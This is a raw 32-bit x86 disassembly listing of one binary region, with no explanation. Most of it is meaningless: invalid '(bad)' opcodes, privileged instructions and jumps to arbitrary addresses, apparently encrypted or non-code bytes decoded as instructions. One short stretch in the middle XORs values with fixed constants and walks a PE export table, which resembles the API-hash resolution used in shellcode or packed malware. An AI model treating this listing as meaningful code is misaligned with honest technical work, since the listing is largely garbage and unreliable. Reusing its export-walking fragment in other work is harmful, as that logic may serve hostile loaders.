  40ee1a:	cli    
  40ee1b:	mov    al,ds:0x1228d590
  40ee20:	add    al,bh
  40ee22:	fs ds mov dh,0xa7
  40ee26:	je     0x40ee9f
  40ee28:	sbb    DWORD PTR [ebx+0x27dac986],ebp
  40ee2e:	outs   dx,DWORD PTR ds:[esi]
  40ee2f:	cmp    dl,bh
  40ee31:	in     eax,dx
  40ee32:	mov    ebp,0x5a7a4a15
  40ee37:	add    BYTE PTR [ebx+0x56],bh
  40ee3a:	inc    ecx
  40ee3b:	push   es
  40ee3c:	sub    BYTE PTR [eax-0x10b7a74f],cl
  40ee42:	outs   dx,DWORD PTR ds:[esi]
  40ee43:	arpl   WORD PTR [ebx-0x6e],bp
  40ee46:	push   es
  40ee47:	(bad)  
  40ee48:	out    0xcf,eax
  40ee4a:	fsubp  st(7),st
  40ee4c:	dec    esi
  40ee4d:	test   DWORD PTR [edi],edx
  40ee4f:	ficomp DWORD PTR [ecx+0x5b]
  40ee52:	jno    0x40ee08
  40ee54:	adc    esi,0x41d71378
  40ee5a:	(bad)  
  40ee5b:	out    0xc0,eax
  40ee5d:	mov    ah,0xd9
  40ee5f:	dec    esp
  40ee61:	daa    
  40ee62:	lds    eax,FWORD PTR ss:[esi-0x10]
  40ee66:	(bad)  
  40ee67:	fisubr DWORD PTR [esi]
  40ee69:	test   BYTE PTR [ecx+0x4b9b1483],cl
  40ee6f:	hlt    
  40ee70:	add    ebx,DWORD PTR [edx+ebp*2-0xa]
  40ee74:	out    dx,eax
  40ee75:	(bad)  
  40ee76:	aas    
  40ee77:	scas   eax,DWORD PTR es:[edi]
  40ee78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee79:	cmp    BYTE PTR [edx],ch
  40ee7b:	test   eax,0x83e23c90
  40ee80:	and    eax,0xd6abfbdc
  40ee85:	out    0xd3,al
  40ee87:	mov    edx,0x48f15246
  40ee8c:	dec    ecx
  40ee8d:	rcl    BYTE PTR [esi+ebp*4-0x5ed2b0d7],cl
  40ee94:	push   ebx
  40ee95:	out    0x73,eax
  40ee97:	push   cs
  40ee98:	sub    BYTE PTR [edx+0x2161673c],cl
  40ee9e:	xor    ebx,DWORD PTR [edi+0x481f612e]
  40eea4:	ds int 0x2e
  40eea7:	aad    0x26
  40eea9:	iret   
  40eeaa:	jmp    0x40ee3c
  40eeac:	mov    eax,0x6b8f47bb
  40eeb1:	jbe    0x40eec8
  40eeb3:	test   al,0xbb
  40eeb5:	and    BYTE PTR [edx],cl
  40eeb7:	es jg  0x40ee41
  40eeba:	xor    eax,esi
  40eebc:	cmp    BYTE PTR [edx],ch
  40eebe:	inc    edi
  40eebf:	mov    edi,0x20c8d667
  40eec4:	xor    ecx,DWORD PTR [edx-0x365e215]
  40eeca:	dec    esp
  40eecb:	ds iret 
  40eecd:	in     ax,dx
  40eecf:	sub    ecx,DWORD PTR [edx]
  40eed1:	cmp    BYTE PTR ds:0x5bc1340c,dl
  40eed7:	sub    al,0x22
  40eed9:	scas   eax,DWORD PTR es:[edi]
  40eeda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eedb:	jmp    0x40eee3
  40eedd:	pusha  
  40eede:	pop    ds
  40eedf:	adc    al,0x12
  40eee1:	jmp    0x4947b69a
  40eee6:	ins    DWORD PTR es:[edi],dx
  40eee7:	aas    
  40eee8:	xor    DWORD PTR [eax+eiz*1-0x14],ebx
  40eeec:	lods   eax,DWORD PTR ds:[esi]
  40eeed:	sbb    BYTE PTR [ebx-0x7e],ah
  40eef0:	sub    edx,DWORD PTR [esi+eax*2+0x8]
  40eef4:	adc    bh,al
  40eef6:	xor    eax,0xed056de0
  40eefb:	cmp    BYTE PTR [ebx-0x70],0x9a
  40eeff:	inc    ebp
  40ef00:	aam    0x89
  40ef02:	out    0x40,eax
  40ef04:	mov    dh,0x1
  40ef06:	inc    edi
  40ef07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef08:	add    al,0x21
  40ef0a:	and    eax,0xb8fa4764
  40ef0f:	fucom  st(0)
  40ef11:	sbb    dl,ah
  40ef13:	sbb    edi,edx
  40ef15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef16:	xchg   edx,eax
  40ef17:	push   ebx
  40ef18:	sub    al,0xfc
  40ef1a:	sbb    DWORD PTR [ecx-0x31],esi
  40ef1d:	inc    edi
  40ef1e:	sbb    eax,0x61892d3a
  40ef23:	xlat   BYTE PTR fs:[ebx]
  40ef25:	imul   eax,DWORD PTR [ebx],0xf2344712
  40ef2b:	test   dl,dl
  40ef2d:	aaa    
  40ef2e:	imul   ecx,DWORD PTR [edx-0x74],0xe9ae9210
  40ef35:	and    al,0xb5
  40ef37:	jno    0x40ef96
  40ef39:	pop    ebx
  40ef3a:	mov    ebp,0xb3a2a54
  40ef3f:	adc    eax,0x22736e3e
  40ef44:	lea    ebp,[ebx]
  40ef46:	add    eax,0x8efc930b
  40ef4b:	sub    esi,DWORD PTR [edi]
  40ef4d:	xor    ch,al
  40ef4f:	sar    ecx,cl
  40ef51:	jb     0x40eee8
  40ef53:	add    esp,ebp
  40ef55:	dec    ecx
  40ef56:	dec    ecx
  40ef57:	mov    ebx,DWORD PTR [esi-0xaf6fcc4]
  40ef5d:	scas   eax,DWORD PTR es:[edi]
  40ef5e:	sub    eax,0x778fba7
  40ef63:	inc    edx
  40ef64:	icebp  
  40ef65:	xchg   ecx,eax
  40ef66:	(bad)  
  40ef67:	cwde   
  40ef68:	sub    al,BYTE PTR [edx+0x3d]
  40ef6b:	fs mov eax,0xf3d785a8
  40ef71:	cli    
  40ef72:	das    
  40ef73:	(bad)  
  40ef74:	mov    bl,BYTE PTR [ecx]
  40ef76:	jmp    0x40ef81
  40ef78:	test   BYTE PTR [edi+0x64d7900e],dl
  40ef7e:	jns    0x40ef94
  40ef80:	sub    eax,DWORD PTR [esi+ebx*8-0x565d0886]
  40ef87:	cmp    di,0x6d
  40ef8b:	xchg   DWORD PTR [edx+0xe],ebp
  40ef8e:	hlt    
  40ef8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef90:	fwait
  40ef91:	cld    
  40ef92:	int    0x8a
  40ef94:	jo     0x40f014
  40ef96:	and    DWORD PTR [esi+0x6c],esi
  40ef99:	inc    esp
  40ef9a:	shr    edi,cl
  40ef9c:	out    0xc8,al
  40ef9e:	or     ebx,ebx
  40efa0:	gs out 0xb8,al
  40efa3:	inc    esi
  40efa4:	js     0x40efc6
  40efa6:	xchg   esi,eax
  40efa7:	faddp  st(5),st
  40efa9:	(bad)  
  40efaa:	in     eax,dx
  40efab:	jecxz  0x40ef5b
  40efad:	clc    
  40efae:	sbb    bl,BYTE PTR [edi]
  40efb0:	mov    DWORD PTR [edx],edi
  40efb2:	xor    dl,BYTE PTR [eax+0x17]
  40efb5:	cmp    DWORD PTR [edx+eax*8+0x49b5e8a9],esp
  40efbc:	stos   DWORD PTR es:[edi],eax
  40efbd:	adc    BYTE PTR [ebp-0x5ffc1cc1],bh
  40efc3:	sub    bh,BYTE PTR [edx-0x70]
  40efc6:	jo     0x40efeb
  40efc8:	xlat   BYTE PTR ds:[ebx]
  40efc9:	or     ch,BYTE PTR [edx-0x6ea29879]
  40efcf:	imul   ebx
  40efd1:	xchg   edi,ebx
  40efd3:	push   ebx
  40efd4:	adc    edi,DWORD PTR [edi]
  40efd6:	cmp    dl,dh
  40efd8:	les    esp,FWORD PTR [edx-0xb5a7212]
  40efde:	or     BYTE PTR [esi+0x68],bh
  40efe1:	and    DWORD PTR [ecx-0x8],0xfffffff3
  40efe5:	das    
  40efe6:	xchg   edx,eax
  40efe7:	mov    edi,0xc7611506
  40efec:	and    DWORD PTR [esi-0x56],esi
  40efef:	popf   
  40eff0:	cmp    al,0x5d
  40eff2:	add    DWORD PTR [esi+0x506a9376],eax
  40eff8:	ror    BYTE PTR [esi+0x31],cl
  40effb:	out    0x8a,eax
  40effd:	ja     0x40ef8f
  40efff:	cmp    dh,dh
  40f001:	js     0x40f00e
  40f003:	ins    BYTE PTR es:[edi],dx
  40f004:	or     edx,DWORD PTR [eax]
  40f006:	mov    eax,DWORD PTR [ebx]
  40f008:	stos   BYTE PTR es:[edi],al
  40f009:	dec    ecx
  40f00a:	pop    ebx
  40f00b:	fsubr  QWORD PTR [ebx-0x71]
  40f00e:	ins    DWORD PTR es:[edi],dx
  40f00f:	scas   al,BYTE PTR es:[edi]
  40f010:	cmp    BYTE PTR [esi+0x16],0x53
  40f014:	mov    edi,0x8e4a2094
  40f019:	out    0xa,eax
  40f01b:	jno    0x40efcf
  40f01d:	cmp    dh,BYTE PTR [esi+0x670aff28]
  40f023:	aaa    
  40f024:	jg     0x40efc7
  40f026:	call   0x1a41:0xbc016831
  40f02d:	into   
  40f02e:	xor    ah,BYTE PTR [edi]
  40f030:	int    0x28
  40f032:	pop    es
  40f033:	sub    esi,DWORD PTR [esi+0x5]
  40f036:	pop    ecx
  40f037:	cmp    BYTE PTR [edx-0x2cf1c750],0xed
  40f03e:	adc    ebp,DWORD PTR [ecx-0x5b]
  40f041:	sysret 
  40f043:	and    DWORD PTR [edx-0x18dec4fa],eax
  40f049:	lea    esi,[edi]
  40f04b:	stos   BYTE PTR es:[edi],al
  40f04c:	mov    ds:0x6bcc6c83,eax
  40f051:	xchg   esp,eax
  40f052:	and    bh,dh
  40f054:	push   cs
  40f055:	cwde   
  40f056:	mov    bh,0x5a
  40f058:	test   eax,0x80686f3d
  40f05d:	mov    eax,ds:0xbd47f161
  40f062:	mov    cl,0x9c
  40f064:	mov    WORD PTR [esi],cs
  40f066:	jmp    0x94dd0f6d
  40f06b:	jno    0x40f0b3
  40f06d:	jno    0x40f0a2
  40f06f:	rcl    ebp,0x73
  40f072:	cmp    bh,BYTE PTR [ebp-0x73]
  40f075:	cmp    eax,DWORD PTR es:[eax]
  40f078:	pop    ss
  40f079:	adc    bl,BYTE PTR [ecx+0x1f]
  40f07c:	sub    al,0xcd
  40f07e:	xchg   esp,eax
  40f07f:	add    edx,0xa212814d
  40f085:	ds mov al,0x9b
  40f088:	inc    ebp
  40f089:	sub    esi,DWORD PTR [eax]
  40f08b:	in     al,0x2d
  40f08d:	retf   
  40f08e:	(bad)  
  40f08f:	scas   al,BYTE PTR es:[edi]
  40f090:	mov    eax,ds:0xdb537641
  40f095:	cmp    bl,BYTE PTR [edx+0x55]
  40f098:	fdiv   st(2),st
  40f09a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f09b:	repz fnsave fs:[esi]
  40f09f:	popf   
  40f0a0:	das    
  40f0a1:	dec    ecx
  40f0a2:	cmp    eax,0x48971d9d
  40f0a7:	idiv   BYTE PTR [edx+0x55654150]
  40f0ad:	stos   DWORD PTR es:[edi],eax
  40f0ae:	mov    dh,0x97
  40f0b0:	scas   eax,DWORD PTR es:[edi]
  40f0b1:	or     eax,0x99034512
  40f0b6:	out    dx,al
  40f0b7:	add    DWORD PTR [edx+0x17],edi
  40f0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0bb:	jg     0x40f120
  40f0bd:	lock imul edi,DWORD PTR [ebx+0x2839faa6],0x7d035d44
  40f0c8:	xchg   ebx,eax
  40f0c9:	std    
  40f0ca:	ret    
  40f0cb:	fiadd  DWORD PTR [eax-0x2ec88baf]
  40f0d1:	fadd   st,st(5)
  40f0d3:	cmp    al,BYTE PTR [ecx+0x2268a845]
  40f0d9:	pop    ss
  40f0da:	repz pop esp
  40f0dc:	js     0x40f0a5
  40f0de:	mov    eax,0x5a2e5aa9
  40f0e3:	jns    0x40f0b9
  40f0e5:	cmp    al,0xd9
  40f0e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e8:	and    dh,BYTE PTR [edx+0x3]
  40f0eb:	fucom  st(6)
  40f0ed:	adc    ebx,DWORD PTR [edx]
  40f0ef:	xor    al,dh
  40f0f1:	xor    DWORD PTR [eax-0x2ae348ed],edi
  40f0f7:	dec    edx
  40f0f8:	mov    dl,0xf4
  40f0fa:	fs pop ss
  40f0fc:	mov    eax,ds:0xe87ea74
  40f101:	add    edx,DWORD PTR [ebp-0x7f945b07]
  40f107:	xor    al,0xe3
  40f109:	adc    DWORD PTR [edx+0x69],esi
  40f10c:	fwait
  40f10d:	jb     0x40f176
  40f10f:	aas    
  40f110:	sar    DWORD PTR [ebp+0x18],1
  40f113:	or     al,0xab
  40f115:	mov    bh,0x5b
  40f117:	adc    ah,ch
  40f119:	sub    cl,dh
  40f11b:	adc    al,BYTE PTR [eax]
  40f11d:	aam    0x69
  40f11f:	aad    0xcb
  40f121:	fs mov ecx,eax
  40f124:	xor    eax,eax
  40f126:	shr    edx,0x2
  40f129:	or     edx,DWORD PTR [ebp+0x14]
  40f12c:	mov    DWORD PTR [ebp+0x10],eax
  40f12f:	mov    eax,DWORD PTR [ebx]
  40f131:	shl    ecx,0x1e
  40f134:	xor    ecx,0xc0000000
  40f13a:	mov    DWORD PTR [ebp-0x64],edx
  40f13d:	mov    edx,DWORD PTR [ebx+0x4]
  40f140:	xor    eax,0xba699573
  40f145:	mov    DWORD PTR [ebp+0x14],ecx
  40f148:	mov    ecx,0x9c0a89d8
  40f14d:	xor    edx,ecx
  40f14f:	shrd   eax,edx,0x2
  40f153:	or     eax,DWORD PTR [ebp+0x10]
  40f156:	shr    edx,0x2
  40f159:	mov    DWORD PTR [ebp-0x70],eax
  40f15c:	mov    eax,edx
  40f15e:	or     eax,DWORD PTR [ebp+0x14]
  40f161:	mov    DWORD PTR [ebp-0x5c],edx
  40f164:	mov    DWORD PTR [ebp-0x6c],eax
  40f167:	mov    eax,DWORD PTR [ebp-0x70]
  40f16a:	cmp    DWORD PTR [ebp-0x68],eax
  40f16d:	jne    0x40f17f
  40f173:	mov    eax,DWORD PTR [ebp-0x6c]
  40f176:	cmp    DWORD PTR [ebp-0x64],eax
  40f179:	je     0x40fcce
  40f17f:	mov    eax,DWORD PTR [ebp+0x8]
  40f182:	mov    edx,DWORD PTR [ebp+0xc]
  40f185:	mov    edx,DWORD PTR [ebp-0x4]
  40f188:	mov    edx,DWORD PTR [edx+0x3c]
  40f18b:	lea    eax,[edx+eax*8+0x78]
  40f18f:	mov    edx,DWORD PTR [ebp-0x4]
  40f192:	mov    eax,DWORD PTR [edx+eax*1]
  40f195:	mov    DWORD PTR [ebp-0x24],eax
  40f198:	jmp    0x40f722
  40f19d:	mov    al,ds:0x187ff383
  40f1a2:	jle    0x40f1c4
  40f1a4:	sub    BYTE PTR [eax-0x7857b743],cl
  40f1aa:	ins    BYTE PTR es:[edi],dx
  40f1ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1ac:	outs   dx,BYTE PTR ds:[esi]
  40f1ad:	mov    ch,0x86
  40f1af:	push   ss
  40f1b0:	push   ss
  40f1b1:	cmp    eax,0x92161604
  40f1b6:	pusha  
  40f1b7:	add    al,0x2c
  40f1b9:	repnz inc ecx
  40f1bb:	hlt    
  40f1bc:	dec    ebx
  40f1bd:	in     eax,0x8d
  40f1bf:	pop    edx
  40f1c0:	scas   eax,DWORD PTR es:[edi]
  40f1c1:	jecxz  0x40f220
  40f1c3:	in     al,0x69
  40f1c5:	add    BYTE PTR [edx-0x53062bde],dl
  40f1cb:	mov    esp,0x2751cdf1
  40f1d0:	jns    0x40f1d6
  40f1d2:	pop    ebx
  40f1d3:	push   0x73
  40f1d5:	mov    ebx,0x70ec413f
  40f1da:	(bad)  
  40f1db:	jmp    0xc13e:0xd1974550
  40f1e2:	gs data16 fst DWORD PTR fs:[ebx+0x59c712a7]
  40f1eb:	add    ah,BYTE PTR [edi+0x176ba620]
  40f1f1:	popa   
  40f1f2:	lock or edx,DWORD PTR [eax]
  40f1f5:	(bad)  
  40f1f6:	call   0x1899c1e4
  40f1fb:	sbb    eax,0x9ebae713
  40f200:	inc    eax
  40f201:	or     cl,BYTE PTR [esi]
  40f203:	jmp    0x40f231
  40f205:	mov    edi,0xd8f2fc9e
  40f20a:	mov    al,ds:0x4017ffc2
  40f20f:	ins    BYTE PTR es:[edi],dx
  40f210:	pop    ds
  40f211:	push   esp
  40f212:	sub    al,BYTE PTR [eax+0x6e553513]
  40f218:	scas   al,BYTE PTR es:[edi]
  40f219:	jg     0x40f1c3
  40f21b:	ror    ebx,1
  40f21d:	in     eax,0xd9
  40f21f:	lea    ebp,[edx+0x7e3335df]
  40f225:	out    dx,al
  40f226:	adc    DWORD PTR [ebp-0x3e],edx
  40f229:	or     edx,DWORD PTR gs:[edx+0x61f0522d]
  40f230:	mov    edi,0xa27021fa
  40f235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f236:	jl     0x40f260
  40f238:	lods   al,BYTE PTR ds:[esi]
  40f239:	jp     0x40f1f5
  40f23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f23c:	or     cl,BYTE PTR [esi+0x4c]
  40f23f:	call   0xe4092ff5
  40f244:	retf   
  40f245:	mov    ch,0x33
  40f247:	sti    
  40f248:	dec    edi
  40f249:	add    BYTE PTR [ebx-0x13],0x2d
  40f24d:	call   0xf979:0xdb5b555a
  40f254:	adc    cl,bl
  40f256:	and    eax,0x450cd279
  40f25b:	outs   dx,DWORD PTR ds:[esi]
  40f25c:	ror    DWORD PTR [eax],cl
  40f25e:	out    0x99,al
  40f260:	cmp    DWORD PTR [edi+esi*1+0x60],ebp
  40f264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f265:	cdq    
  40f266:	mov    edi,0xa4546410
  40f26b:	scas   eax,DWORD PTR es:[edi]
  40f26c:	xchg   ebp,eax
  40f26d:	cmp    BYTE PTR [esi+0x17ab2c1f],0xe8
  40f274:	or     DWORD PTR [ebx-0x4d],esi
  40f277:	out    dx,al
  40f278:	mov    WORD PTR [esi-0x56],?
  40f27b:	iret   
  40f27c:	push   ebx
  40f27d:	ficomp WORD PTR [edi-0x55]
  40f280:	push   ebx
  40f281:	or     bh,BYTE PTR [edi]
  40f283:	adc    dl,BYTE PTR ds:0x5bb67472
  40f289:	push   0x5f82ca0
  40f28e:	scas   al,BYTE PTR es:[edi]
  40f28f:	arpl   cx,si
  40f291:	xchg   esp,eax
  40f292:	aas    
  40f293:	adc    BYTE PTR [edi],0x14
  40f296:	inc    edx
  40f297:	in     eax,dx
  40f298:	or     DWORD PTR [edx],esi
  40f29a:	mov    ch,0xe7
  40f29c:	es xchg ch,cl
  40f29f:	ja     0x40f229
  40f2a1:	popf   
  40f2a2:	mov    edx,0x8e419842
  40f2a7:	test   al,0x48
  40f2a9:	imul   esi,DWORD PTR [eax+0x609a5df4],0x62
  40f2b0:	repnz push ebx
  40f2b2:	fnsave [eax+0x18749901]
  40f2b8:	mov    DWORD PTR [edx],edx
  40f2ba:	enter  0xa396,0x1
  40f2be:	and    ah,BYTE PTR [ecx+ebx*1-0xb]
  40f2c2:	aaa    
  40f2c3:	std    
  40f2c4:	mov    edi,0xb612785
  40f2c9:	xchg   ebx,eax
  40f2ca:	mov    dl,0xbf
  40f2cc:	arpl   cx,ax
  40f2ce:	sti    
  40f2cf:	dec    DWORD PTR [eax]
  40f2d1:	dec    ebx
  40f2d2:	ss jmp 0x696b:0xf258b732
  40f2da:	jnp    0x40f263
  40f2dc:	not    BYTE PTR [esi-0x5d]
  40f2df:	push   esi
  40f2e0:	sahf   
  40f2e1:	push   ecx
  40f2e2:	rol    BYTE PTR [ebp-0x2ba9d734],1
  40f2e8:	in     eax,0x31
  40f2ea:	lock push esi
  40f2ec:	add    edx,DWORD PTR [edx+ebx*1]
  40f2ef:	dec    BYTE PTR [edi+0x6aeab55]
  40f2f5:	scas   al,BYTE PTR es:[edi]
  40f2f6:	jbe    0x40f33f
  40f2f8:	xor    cl,BYTE PTR [ebp-0x8b6ab3e]
  40f2fe:	sub    DWORD PTR [edx+0x10],ebp
  40f301:	cmp    al,0xb3
  40f303:	hlt    
  40f304:	and    esi,DWORD PTR [eiz*4-0x79c07b75]
  40f30b:	cmp    al,0x21
  40f30d:	mov    edx,0x5c31a4be
  40f312:	mov    eax,eax
  40f314:	cwde   
  40f315:	jmp    0x40f2da
  40f317:	add    eax,0xdcf02b67
  40f31c:	and    esi,DWORD PTR [ecx]
  40f31e:	cmp    ebp,edi
  40f320:	pushf  
  40f321:	jb     0x40f2f8
  40f323:	add    ebx,esi
  40f325:	xchg   ebp,eax
  40f326:	fcom   QWORD PTR [ebx-0x333790d5]
  40f32c:	lea    edi,[ebp+0x32]
  40f32f:	aad    0xfb
  40f331:	pushf  
  40f332:	mov    edx,DWORD PTR [eax+edx*1-0x211d53c3]
  40f339:	pop    edi
  40f33a:	outs   dx,BYTE PTR ds:[esi]
  40f33b:	call   0x4a90:0xbd2e2254
  40f342:	add    BYTE PTR ds:0x63eae092,dl
  40f348:	cs mov ebx,0xc68167f9
  40f34e:	cmp    BYTE PTR [eax+0x5e03894e],ch
  40f354:	ja     0x40f3b4
  40f356:	push   ecx
  40f357:	mov    ah,0x6f
  40f359:	mov    BYTE PTR [esp+eax*4+0x6655acbe],ah
  40f360:	mov    esi,0x6a802615
  40f365:	(bad)
  40f369:	fdiv   QWORD PTR [esi]
  40f36b:	inc    esp
  40f36c:	adc    ebp,esi
  40f36e:	pop    ds
  40f36f:	in     eax,dx
  40f370:	lods   al,BYTE PTR ds:[esi]
  40f371:	xchg   edx,eax
  40f372:	sti    
  40f373:	adc    esi,DWORD PTR [ebx-0x34]
  40f376:	loop   0x40f2ff
  40f378:	mov    edx,0x5a150154
  40f37d:	cmp    edi,DWORD PTR [eax-0x29]
  40f380:	sub    al,0x33
  40f382:	or     eax,eax
  40f384:	mov    edi,0x3adacb76
  40f389:	aad    0x7
  40f38b:	pop    ebx
  40f38c:	add    al,0x73
  40f38e:	mov    dh,0xb3
  40f390:	test   eax,0xc3389f32
  40f395:	out    dx,eax
  40f396:	and    dh,BYTE PTR [eax+0x1c]
  40f399:	fisub  WORD PTR [edx]
  40f39b:	jmp    0x4758238a
  40f3a0:	mov    ah,0xbb
  40f3a2:	jmp    0xebdd7cfa
  40f3a7:	ds stos BYTE PTR es:[edi],al
  40f3a9:	inc    edi
  40f3aa:	lods   eax,DWORD PTR ds:[esi]
  40f3ab:	popf   
  40f3ac:	sar    BYTE PTR [eax*2+0x3cbbb313],cl
  40f3b3:	test   al,0xee
  40f3b5:	aas    
  40f3b6:	fwait
  40f3b7:	xchg   edi,eax
  40f3b8:	pushf  
  40f3b9:	jge    0x40f3b1
  40f3bb:	cld    
  40f3bc:	movhps xmm4,QWORD PTR [esi-0x51]
  40f3c0:	outs   dx,BYTE PTR ds:[esi]
  40f3c1:	jmp    0x40f42e
  40f3c3:	and    BYTE PTR [edi+0x7f95ec80],dh
  40f3c9:	mov    bl,0x44
  40f3cb:	push   edi
  40f3cc:	inc    edx
  40f3cd:	mov    ebp,0x680548af
  40f3d2:	bound  edx,QWORD PTR [ebp+0x5bc0a44d]
  40f3d8:	cmp    al,0xb2
  40f3da:	outs   dx,BYTE PTR ds:[esi]
  40f3db:	or     DWORD PTR [ecx+0x2d],eax
  40f3de:	les    ebp,FWORD PTR [edi+0x26]
  40f3e1:	scas   al,BYTE PTR es:[edi]
  40f3e2:	retf   
  40f3e3:	and    eax,0xb957e3a7
  40f3e8:	jecxz  0x40f381
  40f3ea:	out    dx,al
  40f3eb:	(bad)  
  40f3ec:	cld    
  40f3ed:	sbb    al,0xf6
  40f3ef:	mov    cl,0x7a
  40f3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3f2:	and    esp,DWORD PTR [eax-0x1ffc078a]
  40f3f8:	(bad)  
  40f3f9:	mov    DWORD PTR [edi-0x5b21139c],esp
  40f3ff:	push   cs
  40f400:	ja     0x40f449
  40f402:	mov    ebx,0xbe1afd97
  40f407:	das    
  40f408:	push   ss
  40f409:	xchg   esp,eax
  40f40a:	test   eax,0x18a375dc
  40f40f:	mov    ch,0x8f
  40f411:	(bad)  
  40f412:	xor    al,0x86
  40f414:	add    eax,ecx
  40f416:	mov    al,ds:0xc8ea8e8e
  40f41b:	push   ss
  40f41c:	and    al,0x8c
  40f41e:	stc    
  40f41f:	(bad)  
  40f420:	jl     0x40f3ad
  40f422:	xor    cl,BYTE PTR [esi+0x74]
  40f425:	enter  0x3454,0x16
  40f429:	shl    bh,1
  40f42b:	mov    ebp,ecx
  40f42d:	call   0xcfc047b
  40f432:	daa    
  40f433:	fwait
  40f434:	cmc    
  40f435:	jecxz  0x40f42f
  40f437:	and    BYTE PTR ds:0x224c6d14,0x34
  40f43e:	xor    esp,ebx
  40f440:	cmp    ch,BYTE PTR [ecx-0x866c140]
  40f446:	popf   
  40f447:	mov    al,bl
  40f449:	mov    ?,WORD PTR [edx]
  40f44b:	add    edx,DWORD PTR [edx+0x63]
  40f44e:	aam    0xf7
  40f450:	cmp    eax,0x759855f1
  40f455:	call   0x2a5d5eb8
  40f45a:	aas    
  40f45b:	push   ds
  40f45c:	fisttp QWORD PTR [ebx-0x2661bd4c]
  40f462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f463:	add    eax,0x9ac7714c
  40f468:	lahf   
  40f469:	push   eax
  40f46a:	sub    BYTE PTR [edi-0x4aa43029],bh
  40f470:	mov    ds:0xf46e436b,eax
  40f475:	mov    bh,0x82
  40f477:	cli    
  40f478:	jecxz  0x40f482
  40f47a:	jmp    0xaf4e0960
  40f47f:	aad    0x81
  40f481:	adc    bl,0x3b
  40f484:	push   esp
  40f485:	out    0x85,eax
  40f487:	mov    WORD PTR [eax-0x55],gs
  40f48a:	repz sub al,0xff
  40f48d:	dec    eax
  40f48e:	xchg   ebp,eax
  40f48f:	dec    ebx
  40f490:	add    dh,bl
  40f492:	mov    edi,0xdc65afca
  40f497:	mov    edi,0x163b1dec
  40f49c:	in     eax,0xdf
  40f49e:	sub    ch,cl
  40f4a0:	adc    eax,0x73b4e0e3
  40f4a5:	stos   DWORD PTR es:[edi],eax
  40f4a6:	enter  0xadc9,0x62
  40f4aa:	mov    esi,0x2341a548
  40f4af:	call   0x33119da
  40f4b4:	xchg   esp,eax
  40f4b5:	popf   
  40f4b6:	outs   dx,DWORD PTR ds:[esi]
  40f4b7:	mov    ecx,0xf2e8a104
  40f4bc:	stos   DWORD PTR es:[edi],eax
  40f4bd:	pop    es
  40f4be:	test   eax,0xc7636378
  40f4c3:	mov    ebp,0x7a3505d4
  40f4c8:	jp     0x40f465
  40f4ca:	test   al,0xcd
  40f4cc:	outs   dx,DWORD PTR ds:[esi]
  40f4cd:	sub    al,0xcb
  40f4cf:	xor    ebx,esi
  40f4d1:	icebp  
  40f4d2:	gs out dx,al
  40f4d4:	das    
  40f4d5:	shl    DWORD PTR [eax-0x40],1
  40f4d8:	inc    edi
  40f4d9:	lea    ebx,[edi-0x59]
  40f4dc:	push   esp
  40f4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4de:	into   
  40f4df:	push   ebx
  40f4e0:	adc    BYTE PTR [esi+0x23],cl
  40f4e3:	(bad)  
  40f4e4:	push   esi
  40f4e5:	xchg   esi,eax
  40f4e6:	cld    
  40f4e7:	fstp   TBYTE PTR [eax+0x3e]
  40f4ea:	inc    esp
  40f4eb:	gs bnd jb 0x40f4c8
  40f4ef:	xor    BYTE PTR [ebx-0x7b7f37a5],cl
  40f4f5:	repz sbb edi,ecx
  40f4f8:	adc    BYTE PTR [ebx],dh
  40f4fa:	call   0xb9deb3e3
  40f4ff:	out    0x8f,al
  40f501:	(bad)  
  40f502:	ja     0x40f52d
  40f504:	xor    BYTE PTR [esi],0x6c
  40f507:	xchg   edx,eax
  40f508:	jae    0x40f554
  40f50a:	push   0x1f
  40f50c:	repz adc ebx,eax
  40f50f:	xlat   BYTE PTR ds:[ebx]
  40f510:	outs   dx,BYTE PTR ds:[esi]
  40f511:	sbb    al,0x85
  40f513:	jno    0x40f560
  40f515:	mov    bl,BYTE PTR [edi+0x4b]
  40f518:	in     al,dx
  40f519:	imul   esp,DWORD PTR [edi],0x7117d245
  40f51f:	or     al,0xd9
  40f521:	aas    
  40f522:	rep lods eax,DWORD PTR ds:[esi]
  40f524:	xor    eax,0x288b3ccb
  40f529:	mov    bh,0xee
  40f52b:	leave  
  40f52c:	mov    ebp,0xb1365984
  40f531:	inc    eax
  40f532:	pop    eax
  40f533:	pop    ecx
  40f534:	ret    
  40f535:	fmul   DWORD PTR [eax+eiz*1+0x49d1b910]
  40f53c:	test   DWORD PTR ds:0xaed11132,ebx
  40f542:	frstor [ecx+eiz*8+0x38]
  40f546:	rol    DWORD PTR [esi-0xdd8fe43],0xe4
  40f54d:	stos   BYTE PTR es:[edi],al
  40f54e:	wrmsr  
  40f550:	lahf   
  40f551:	sbb    BYTE PTR [edi+0x1e],0x3c
  40f555:	push   es
  40f556:	and    ch,cl
  40f558:	into   
  40f559:	loopne 0x40f54b
  40f55b:	cwde   
  40f55c:	dec    eax
  40f55d:	push   ds
  40f55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f55f:	dec    ecx
  40f560:	pop    ds
  40f561:	lods   eax,DWORD PTR ds:[esi]
  40f562:	js     0x40f5a9
  40f564:	jmp    0x6c7b:0xa04fdec9
  40f56b:	fistp  WORD PTR [edx+ebp*1+0x1f]
  40f56f:	and    eax,0xebb93fd8
  40f574:	or     eax,0x48045365
  40f579:	fwait
  40f57a:	retf   0x3e18
  40f57d:	stos   DWORD PTR es:[edi],eax
  40f57e:	lahf   
  40f57f:	sbb    al,0x2e
  40f581:	in     eax,0xc
  40f583:	int    0x26
  40f585:	mov    edx,0xe37d35a1
  40f58a:	nop
